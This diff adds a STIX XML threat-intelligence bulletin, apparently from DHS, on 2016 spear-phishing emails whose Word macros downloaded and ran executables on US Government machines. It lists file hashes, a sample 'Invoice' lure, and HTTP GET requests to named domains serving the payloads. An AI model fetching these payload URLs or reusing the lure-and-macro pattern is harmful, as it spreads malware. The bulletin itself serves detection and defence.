@@ -1,0 +1,236 @@
+<stix:STIX_Package xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://us-cert.gov/ciscp" xmlns:EmailMessageObj="http://cybox.mitre.org/objects#EmailMessageObject-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:NCCIC="http://www.us-cert.gov/nccic" xmlns:TOUMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:simpleMarking="http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="IB-16-10021" timestamp="2016-03-15T19:36:35.163000+00:00" version="1.1.1" xsi:schemaLocation="  http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd  http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd  http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd  http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd  http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd  http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd  http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd  http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd  http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd  http://data-marking.mitre.org/extensions/MarkingStructure#Terms_Of_Use-1 http://stix.mitre.org/XMLSchema/extensions/marking/terms_of_use/1.0.1/terms_of_use_marking.xsd  http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd  http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd  http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd  http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd     http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd"><stix:STIX_Header><stix:Title>US Government E-mail Accounts Targeted by MS Word Macro Spear-Phishing</stix:Title><stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Phishing</stix:Package_Intent><stix:Description>In January 2016, at least three US Government email accounts were targeted by spear-phishing emails that originated from the same UK IP address. Each email contained a Microsoft Word attachment containing a malicious auto-run macro.</stix:Description><stix:Handling><marking:Marking><marking:Controlled_Structure>//node()</marking:Controlled_Structure><marking:Marking_Structure xsi:type="TOUMarking:TermsOfUseMarkingStructureType"><TOUMarking:Terms_Of_Use>This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp .</TOUMarking:Terms_Of_Use></marking:Marking_Structure><marking:Marking_Structure color="AMBER" xsi:type="tlpMarking:TLPMarkingStructureType"/><marking:Marking_Structure xsi:type="TOUMarking:TermsOfUseMarkingStructureType"><TOUMarking:Terms_Of_Use>WARNING: This document is FOR OFFICIAL USE ONLY (FOUO). It contains information that may be exempt from public release under the Freedom of Information Act (5 U.S.C. 552). It is to be controlled, stored, handled, transmitted, distributed, and disposed of in accordance with DHS policy relating to FOUO information and is not to be released to the  public or other personnel who do not have a valid "need-to-know" without prior approval of an authorized DHS official.</TOUMarking:Terms_Of_Use></marking:Marking_Structure><marking:Marking_Structure xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>FOUO</simpleMarking:Statement></marking:Marking_Structure></marking:Marking></stix:Handling><stix:Information_Source><stixCommon:Time><cyboxCommon:Produced_Time>2016-03-15T19:36:25+00:00</cyboxCommon:Produced_Time></stixCommon:Time></stix:Information_Source></stix:STIX_Header><stix:Indicators><stix:Indicator id="indicator-275e9d5e-ca98-11e5-8b50-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious E-mail Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malicious E-mail</indicator:Type><indicator:Description>Each of the spear-phishing emails contained a different attachment:
+
+96413.DOC (MD5: 6DDC018D06179EA937A4D832B11E37FE)
+doc4502094035.doc (MD5: F28CF8C327D01074DB2460C3E5573542)
+PaymentVoucher.doc (MD5: 285D3D6C43148C9687124249C8632061)
+
+The following is an example of one of the spear-phishing emails:
+
+------BEGIN EMAIL HEADER------
+
+EHLO h88-150-135-12.host.redstation.co.uk
+MAIL FROM:&lt;Redacted&gt;
+RCPT TO:&lt;TARGET&gt;
+DATA
+From: &lt;Redacted&gt;
+To: &lt;TARGET&gt;
+Subject: Invoice
+Date: Thu, 28 Jan 2016 16:33:12 +0430
+Message-ID: &lt;6710D9365D773E4A8FEE74A296F9B6F60F6F66A563@WTCSBS.whirlowdale.local&gt;
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+boundary="----=_NextPart_000_0E98_01CF1681.927CABF0"
+X-Mailer: Microsoft Outlook 14.0
+Thread-Index: AQMFWrsI7bx5HXVWq1/RqwGSxCA92g==
+Content-Language: en-us
+X-OlkEid: 36A4A42079E13CC2223C4049A78DA7FFB51D64D1
+content-class: urn:content-classes:message
+X-MS-TNEF-Correlator:
+x-ms-has-attach: yes
+
+------END EMAIL HEADER------
+
+
+
+
+-----START EMAIL BODY------
+
+Thank you for your order. Your Invoice - 96413 - is attached.
+
+-----END EMAIL BODY---
+
+
+Based on the domain of each sender of the spear-phishing email resolving to a legitimate website, it is likely the senders' email addresses are spoofed.</indicator:Description><indicator:Observable id="NCCIC:Observable-a3b48fdc-5b01-4b71-bf26-a9761c3e7ede"><cybox:Object id="NCCIC:Object-275e9d60-ca98-11e5-b706-180373b1f207"><cybox:Properties xsi:type="EmailMessageObj:EmailMessageObjectType"><EmailMessageObj:Header><EmailMessageObj:Subject>Invoice</EmailMessageObj:Subject><EmailMessageObj:Message_ID>6710D9365D773E4A8FEE74A296F9B6F60F6F66A563@WTCSBS.whirlowdale.local</EmailMessageObj:Message_ID><EmailMessageObj:X_Mailer>Microsoft Outlook 14.0</EmailMessageObj:X_Mailer></EmailMessageObj:Header></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="indicator-eadac100-ca99-11e5-86cb-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious File Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">File Hash Watchlist</indicator:Type><indicator:Description>Analysis:
+
+Microsoft Word document containing a malicious auto-run macro. When opened with Microsoft Word, the macro downloaded a remote executable file (6DDC018D06179EA937A4D832B11E37FE), dropped the executable in the Users Local Temp directory as pcoryphanthaquickset.exe and executed the dropped file.
+
+The Word document displayed the following text:
+
+Enable macro if the data encoding is incorrect
+
+3ХVFС�??нlв�??�?�?��??6�?D�??©Х�?�?�?�?�??�?��?? Y�?�?й�?P�?�,�?$¦�?�?��?�Ь к�? д%y}�? �?R7�?�?9¬йN+�??®Щ�?&lt;X�?!С�?$O&gt;¬�??¬iб[�?ZS�?�?�??$ �?4�? �?�?�?�?`°�? �?BS�? zо I �?\Х3x°0¤�??e"] !�?�?c LgIг �?9�?1©f�?�?yк»X�? �?f6YINk�?�?ЪV�?�??u �?�?�?�?�?�?�e©�??±µ1V ±s $Lj%�?�?[�?�?`л-;�?©B�?+Ь4�?�?�?�?p[;.п�?f�?X�?'�?«�?m�?&lt;гFbpкy�?/�??�?д�?&gt;�??¬ Ч©�?�?�??оRЬ"ЯrCg�?�kа�? �?б�?C�?A8MC�?�?�4�?�k �?�&amp;tи�?¶�?LСJХСM�??R�? *�?�?Щv�?Bк�??�?��?�?иi�?�?§�?�??�?� �?IN |sSS3 | Ю5Щн?L�?� }ТM �?��  в'�?�?I�?v~�?Ф6�?�?r�?�&gt;A5'3 м�?з�-&amp;&amp;�?F"�?�5@¦¤�?�?¶�?B�? `�?к�?�? �?�Bе©�?iB�?��?�DjT�?�?��?; �?gW�-3¶�?�?[�?�?�?�?ж�?&lt;E� �? @�?�5 Hu�??8I�?µBxм&amp;в�?�??�?=n�? \�?�©&lt;V�?��??Ю\�??�?Q rмg¦�?�H�?p�?[\�? n Щг�?�?±3�?�?[Юi]P24�?��? @ШN4 (�?�?�?nУ»�?�?d�?L^yй�?�K7�?d¦�?p#©�?{�?��??U /4 нЪJ�?3�??У?� ^uЮ ?±Ц�? �? е�?
+о�?,3K]�??�?J �?u,4 �?» L0Чг�??�?TйCkNPЧ�?R�?�?b
+
+The following changes were made to the system:
+
+File added:
+
+C:\Documents and Settings\User\Local Settings\Temp\pcoryphanthaquickset.exe (Note: Malicious file to be provided by attacker)
+
+The following network traffic was observed:
+
+DNS Request (port 53):
+astigarragakomusikaeskola.com
+
+TCP connection www.astigarragakomusikaeskola.com port 80:
+GET /nuyff45d/87tf23w.exe HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
+Host: astigarragakomusikaeskola.com
+Connection: Keep-Alive
+
+
+Additional Virustotal.com file name information pertaining to the 96413.doc below:
+
+Purchase_Order_Number__2001800526_1.doc
+f78e88da5c7a4cc09f84696e082221a2
+96413.DOC
+0fea207420c6e3c0f69884865a0a8f4b
+96413 2.DOC
+VIRUS_96413.DOCVVV
+96413 - Copy.DOC
+96413.DOC
+Purchase_Order_Number__2001800526_2.doc
+96413.doc
+c3fea732a1aca26e4fc2b0ce34b8b52e
+ca491efc45c88a17da7ee9793cee10f2
+172928e6b3addbd2d1d7f7672b653b90
+Purchase_Order_Number__2001800526.doc
+PAYMENT VOUCHER.DOC
+96413.doc
+f92337d3097225f9c70dcc1d9064dee66a620f65c890139d4ac06efdc45e7e2a.bin
+196413.DOC
+13fd6c73e732d3ad4e792a5e1477034c
+96413_2.DOC
+d878983a2d13fb6ce2d963daf3c4f204
+6d113940636a46914867843001be2c68
+97b3c688646736b668ce70bef0642cc4</indicator:Description><indicator:Observable id="NCCIC:Observable-9d3749c0-dd79-40c0-8286-0bce323a93de"><cybox:Object id="NCCIC:Object-eadac102-ca99-11e5-84a8-180373b1f207"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name>96413.DOC</FileObj:File_Name><FileObj:Size_In_Bytes>48128</FileObj:Size_In_Bytes><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>6DDC018D06179EA937A4D832B11E37FE</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>D787314ADA1719DC4D4BBA0345F80D5D7EDCCEC1</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>F92337D3097225F9C70DCC1D9064DEE66A620F65C890139D4AC06EFDC45E7E2A</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>384:TPls6mdVKeOTBy1bxfIKDkEIow/y9izltFsg1dZq/nR3b81L2Z0jd1wKICPuCHX:Ty1deT0JtDkEIXJ71WnR41La+wTOLHX</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="indicator-53654bf0-ca9a-11e5-a888-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious File Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">File Hash Watchlist</indicator:Type><indicator:Description>The malware for the second attachment had the following characteristics:
+
+Analysis:
+
+Microsoft Word document containing malicious auto-run macro, when opened with Microsoft Word, the macro downloaded a remote executable file, dropped the executable in the Users Local Temp directory as plackbrainschoolfriend.exe and executed the dropped file.
+
+The Word document displayed the following text:
+
+If this document has incorrect encoding - enable macro
+
+?xc??}L?S5(fj?`?�??$??(?? xk"�??UY`??w(?s??_o?" ?zF��I"J?g.W
+P?K??[?@ ?IS*F???�U)??????? ?M?`4 ?6T I2I}jJ?N?S?I?-??,&lt;5? ??P
+$S?GZ???`�? �?S????t?SR??????? K??????#S%?? +?F9?hW{F*(?�zw????L\+?% m?P?kM$iqF?-??&amp;? ?)?1?3bU ??(?Z&#127;\ssF?Wt?$(??&gt;C?Y ?/)e?? uF?[k7V?N\? ????mS .4????ZP S g?5?{????'h�-???2^?j?,m?? Vt?f,Z??�????????L�y'-H|???d? oT??u????;�???? ??????? ?M?`4 ?6T I2I}jJ?N?S?I?-??,&lt;5? ??PL\+?% m?P?kM$iqF????3??;@_^[??U??W3?3??y$S?GZ???`�? �?S L\+?% m?P?kM$iqF?�???
+
+The following changes were made to the system:
+
+File added:
+----------------------------------
+C:\Documents and Settings\User\Local Settings\Temp\plackbrainschoolfriend.exe (Note: Malicious file to be provided by attacker)
+
+The following network traffic was observed:
+
+DNS Request (port 53):
+cityofdavidchurch.org
+GET /54t4f4f/7u65j5hg.exe HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
+Host: www.cityofdavidchurch.org
+Connection: Keep-Alive
+
+
+Additional Virustotal.com file name information pertaining to the 96413.doc below:
+
+doc4502094035.alt.doc
+doc4502094035.doc.txt
+doc4502094035.doc.vir
+b8505379312d4db1e1141a0e3cf8c4e5
+VIRUS.doc
+doc4502094035.doc
+virus.doc
+3635a107bc841dbc6e0e7a530dfffb60
+f28cf8c327d01074db2460c3e5573542.doc
+1deecf913366e38437ec6477503f11760d47f337.doc
+doc4502094035.doc.virus
+160127.doc
+6d7fac8d5204cf02b31a5cbb8d9c8d36
+f881390cc8f3420c8ff50984f68c8772.doc
+i.doc
+VIRUS_doc4502094035.docVVV
+doc4502094035-2.doc</indicator:Description><indicator:Observable id="NCCIC:Observable-886055b5-3e70-4302-b01f-81fa69611db7"><cybox:Object id="NCCIC:Object-53654bf2-ca9a-11e5-a6ea-180373b1f207"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name>doc4502094035.doc</FileObj:File_Name><FileObj:Size_In_Bytes>45568</FileObj:Size_In_Bytes><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>F28CF8C327D01074DB2460C3E5573542</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>1deecf913366e38437ec6477503f11760d47f337</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>fb774d22f9af4fb7f1f353b5f78fb1574b02d318fdbdba810d433ec638a29db5</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>384:wtSKDpMBlYkimtTeaZCIrzA+4EqRwAPw5nGpuZ0j03QK65:Gp6lB1zY+4puAPaGpSn3Qb</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="indicator-769886f0-ca9a-11e5-a148-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious File Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">File Hash Watchlist</indicator:Type><indicator:Description>Analysis:
+
+Microsoft Word document containing a malicious auto-run macro. When opened with Microsoft Word, the macro downloaded a remote executable file, dropped the executable in the Users Local Temp directory as zimbazi.exe and executed the dropped file.
+
+The Word document displayed the following text:
+
+functional
+
+The following changes were made to the system:
+
+File added:
+----------------------------------
+C:\Documents and Settings\User\Local Settings\Temp\zimbazi.exe (Note: Malicious file to be provided by attacker)
+
+The following network traffic was observed:
+
+DNS Request (port 53):
+c10-qadevtest.net
+
+GET /nuyff45d/87tf23w.exe HTTP/1.1
+Accept: */*
+Accept-Encoding: gzip, deflate
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)
+Host: www.c10-qadevtest.net
+Connection: Keep-Alive
+
+
+Additional Virustotal.com file name information pertaining to the 96413.doc below:
+
+RG-6160002-SFLEX-ENERIBA-Burkhart Wil-2016-01-28.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+x.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+rg_6160002_sflex_eneriba_burkhart_wil_2016_01_28.doc
+RG-Virus.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc.vir
+virus_in_mail.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart,Wil-2016-01-281453992886997.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+PAYMENT VOUCHER.DOC
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+6c10aa994a28a7bc9e8f6f286777ddbd
+RG-6160002-SFLEX-ENERIBA-Burkhart.doc
+RG-_-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.do_
+RG.doc
+virus.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart,XWil-2016-01-28.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28 2.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart, Wil-2016-01-28.doc
+RG-6160002-SFLEX-ENERIBA-Burkhart,_Wil-2016-01-28.doc</indicator:Description><indicator:Observable id="NCCIC:Observable-b679573e-a6b7-45cb-98fb-79ecf545712a"><cybox:Object id="NCCIC:Object-769886f2-ca9a-11e5-aa1b-180373b1f207"><cybox:Properties xsi:type="FileObj:FileObjectType"><FileObj:File_Name>PaymentVoucher.doc</FileObj:File_Name><FileObj:Size_In_Bytes>78336</FileObj:Size_In_Bytes><FileObj:Hashes><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>285D3D6C43148C9687124249C8632061</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>9be60b2f74e349b68579d3c2cbb25e57f88830e1</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>4beb62aac38acf7687ff3e2eef3375a2784b25c156e7a091e5cad5bb96188c1f</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash><cyboxCommon:Hash><cyboxCommon:Type xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type><cyboxCommon:Simple_Hash_Value>768:pqnoAmqJFBlhTexD2yfxlaBy9DrD5y7mIpmsAJzYXeamMrcKtDtjmpi:raexDraBypruHOz/MBjjmY</cyboxCommon:Simple_Hash_Value></cyboxCommon:Hash></FileObj:Hashes></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="indicator-f4cb130f-ca97-11e5-a041-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious URL Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>At least three US Government accounts were targeted by spear-phishing emails originating from the same UK IP address.  Each email had a Microsoft Word attachment containing a malicious auto-run macro, that when opened with Microsoft Word, the macro downloaded a remote executable and called out to one of the following domains (additional details provided by Robtex):
+
+astigarragakomusikaeskola.com
+cityofdavidchurch.org
+c10-qadevtest.net
+
+The following data was derived from Robtex.com and open sources:
+
+Domain, astigarragakomusikaeskola.com, is registered to dinahosting.com domain hosting service, based in Spain and resolves to this IP: 82.98.134.155
+
+IP: 82.98.134.155 in what appears to be a separate and unrelated activity, the same IP: 82.98.134.155 touched the following domain, cineiapatchwork.com, which was associated with the Ice IX malware family based on the Zeus source code that harvests personal financial information. 
+
+Virustotal data shows overlap between www.astigarragakomusikaeskola.com and Dridex malware (low confidence).</indicator:Description><indicator:Observable id="NCCIC:Observable-2b962fbe-05a5-454a-b976-4181b537f048"><cybox:Object id="NCCIC:Object-f4d23f01-ca97-11e5-a5c6-180373b1f207"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value>www.astigarragakomusikaeskola.com</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="indicator-f5f980ee-ca97-11e5-9602-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious URL Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>At least three US Government accounts were targeted by spear-phishing emails originating from the same UK IP address. Each email had a Microsoft Word attachment containing a malicious auto-run macro, that when opened with Microsoft Word, the macro downloaded a remote executable and called out to one of the following domains(additional details provided by Robtex):
+
+astigarragakomusikaeskola.com
+cityofdavidchurch.org
+c10-qadevtest.net
+
+The following data was derived from Robtex.com and open sources:
+
+cityofdavidchurch.org is tagged as a Spam and Malware domain (medium confidence) and has a Detection ratio of  5 / 66  
+
+Most malicious activity associated with this domain is cyber crime oriented.
+
+Virustotal data:
+
+Final URL after redirects:
+http://cityofdavidchurch.org/54t4f4f/7u65j5hg.exe 
+IP resolution: 66.175.58.9</indicator:Description><indicator:Observable id="NCCIC:Observable-06174f44-eedd-401f-8046-db1262c872cd"><cybox:Object id="NCCIC:Object-f5f980f0-ca97-11e5-8429-180373b1f207"><cybox:Properties type="URL" xsi:type="URIObj:URIObjectType"><URIObj:Value>www.cityofdavidchurch.org</URIObj:Value></cybox:Properties></cybox:Object></indicator:Observable><indicator:Kill_Chain_Phases><stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChainPhase-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/></indicator:Kill_Chain_Phases><indicator:Handling><marking:Marking><marking:Controlled_Structure>ancestor-or-self::stix:Indicator//node()</marking:Controlled_Structure><marking:Marking_Structure marking_model_name="TLP" xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: GREEN. Recipients may only share TLP: GREEN information with peers and partner organizations within their sector or community, but not via publicly accessible channels. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp .</simpleMarking:Statement></marking:Marking_Structure><marking:Marking_Structure color="AMBER" xsi:type="tlpMarking:TLPMarkingStructureType"/><marking:Marking_Structure marking_model_name="FOUO" xsi:type="simpleMarking:SimpleMarkingStructureType"><simpleMarking:Statement>FOUO</simpleMarking:Statement></marking:Marking_Structure></marking:Marking></indicator:Handling><indicator:Sightings sightings_count="1"><indicator:Sighting timestamp="2016-01-27T00:00:00"/></indicator:Sightings></stix:Indicator><stix:Indicator id="indicator-f71c2f00-ca97-11e5-b1c0-180373b1f207" timestamp="2016-03-15T19:36:35.163000+00:00" xsi:type="indicator:IndicatorType"><indicator:Title>Malicious URL Indicator</indicator:Title><indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type><indicator:Description>At least three US Government accounts were targeted by spear-phishing emails originating from the same UK IP address.  Each email had a Microsoft Word attachment containing a malicious auto-run macro, that when opened with Microsoft Word, the macro downloaded a remote executable and called out to one of the following domains (additional details provided by Robtex):
+
+astigarragakomusikaeskola.com
+cityofdavidchurch.org
+c10-qadevtest.net
+
+The following data was derived from Robtex.com and open sources:
+
